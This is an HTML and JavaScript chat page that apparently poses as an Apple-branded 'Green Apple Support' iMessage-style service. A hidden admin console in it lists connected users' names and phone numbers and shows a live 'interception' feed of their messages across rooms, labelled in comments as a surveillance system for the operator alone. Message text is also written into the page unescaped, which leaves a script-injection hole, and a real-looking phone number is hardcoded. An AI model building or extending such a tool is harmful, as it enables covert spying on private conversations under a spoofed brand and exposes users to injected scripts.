<!DOCTYPE html>
<html lang="bs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Green Apple Support Console</title>
    <style>
        :root { --apple-green: #32d74b; --bg: #000; --panel: #1c1c1e; }
        body { font-family: -apple-system, sans-serif; background: var(--bg); margin: 0; color: white; height: 100vh; display: flex; flex-direction: column; }
        
        .header { background: #111; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 0.5px solid #333; }
        
        /* Admin Console Overlay */
        #admin-console { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; z-index: 10000; overflow-y: auto; padding: 20px; box-sizing: border-box; }
        .monitor-box { background: #111; border: 1px solid #333; border-radius: 10px; padding: 10px; margin-top: 20px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px; }
        .spy-log { border-bottom: 0.5px solid #222; padding: 5px 0; color: #aaa; }
        .spy-log b { color: var(--apple-green); }

        /* Chat UI */
        #chat { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 8px; }
        .msg { padding: 10px 15px; border-radius: 20px; max-width: 75%; font-size: 15px; list-style: none; }
        .me { align-self: flex-end; background: var(--apple-green); color: black; }
        .them { align-self: flex-start; background: var(--panel); color: white; }

        .input-area { background: var(--bg); padding: 15px; display: flex; gap: 10px; border-top: 0.5px solid #222; }
        input { flex: 1; background: #262629; border: none; padding: 12px; border-radius: 25px; color: white; outline: none; }
        .btn-admin { background: none; border: 1px solid var(--apple-green); color: var(--apple-green); border-radius: 5px; padding: 5px 10px; font-size: 12px; cursor: pointer; }
    </style>
</head>
<body>

<div id="admin-console">
    <h2 style="color: var(--apple-green); margin-top: 0;">Support Central Dashboard 🍏</h2>
    
    <h3>Aktivni Korisnici & Sobe:</h3>
    <div id="user-list"></div>

    <h3>Live Chat Monitor (Presretanje):</h3>
    <div id="spy-monitor" class="monitor-box">
        <div style="color: #666;">Čekam na poruke...</div>
    </div>

    <button onclick="toggleAdmin()" style="width: 100%; background: #ff3b30; color: white; border: none; padding: 15px; border-radius: 10px; margin-top: 20px; font-weight: bold;">ZATVORI KONZOLU</button>
</div>

<div class="header">
    <div style="display: flex; align-items: center; gap: 10px;">
        <img src="https://img.icons8.com/color/96/000000/apple.png" width="35">
        <div>
            <b>Green Apple Support</b><br>
            <small id="online-info" style="color: var(--apple-green);">Povezivanje...</small>
        </div>
    </div>
    <button class="btn-admin" onclick="toggleAdmin()">ADMIN PANEL</button>
</div>

<ul id="chat"></ul>

<form class="input-area" id="msg-form">
    <input id="msg-input" placeholder="iMessage" autocomplete="off">
    <button type="submit" style="background: var(--apple-green); border:none; border-radius:50%; width:35px; height:35px;">↑</button>
</form>

<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io();
    const myPhone = "00387603344334";
    const myName = "Support Admin";
    let currentRoom = "support_global";

    socket.emit('join', { room: currentRoom, name: myName, phone: myPhone });

    function toggleAdmin() {
        const console = document.getElementById('admin-console');
        console.style.display = console.style.display === 'block' ? 'none' : 'block';
    }

    // Chat Slanje
    document.getElementById('msg-form').onsubmit = (e) => {
        e.preventDefault();
        const input = document.getElementById('msg-input');
        if(input.value) {
            socket.emit('chat message', { name: myName, text: input.value, phone: myPhone, room: currentRoom });
            input.value = '';
        }
    };

    // Chat Prijem (Normalan)
    socket.on('chat message', (data) => {
        const li = document.createElement('li');
        li.className = `msg ${data.phone === myPhone ? 'me' : 'them'}`;
        li.innerHTML = `<small style="display:block; font-size:9px; opacity:0.6">${data.name}</small>${data.text}`;
        document.getElementById('chat').appendChild(li);
        document.getElementById('chat').scrollTop = document.getElementById('chat').scrollHeight;
    });

    // --- NADZORNI SISTEM (Samo za tebe) ---
    socket.on('admin update', (users) => {
        document.getElementById('online-info').innerText = `${users.length} aktivnih`;
        const list = document.getElementById('user-list');
        list.innerHTML = "";
        users.forEach(u => {
            const card = document.createElement('div');
            card.style.background = "#1c1c1e";
            card.style.padding = "10px";
            card.style.marginBottom = "5px";
            card.style.borderRadius = "8px";
            card.innerHTML = `<b>${u.name}</b> (${u.phone}) <br> <small style="color: #888">Soba: ${u.room}</small>`;
            list.appendChild(card);
        });
    });

    socket.on('spy message', (data) => {
        const monitor = document.getElementById('spy-monitor');
        const log = document.createElement('div');
        log.className = 'spy-log';
        log.innerHTML = `[${data.time}] <b>${data.from}</b> (u sobi: ${data.room}): ${data.text}`;
        monitor.prepend(log); // Najnovije poruke na vrh
    });
</script>
</body>
</html>
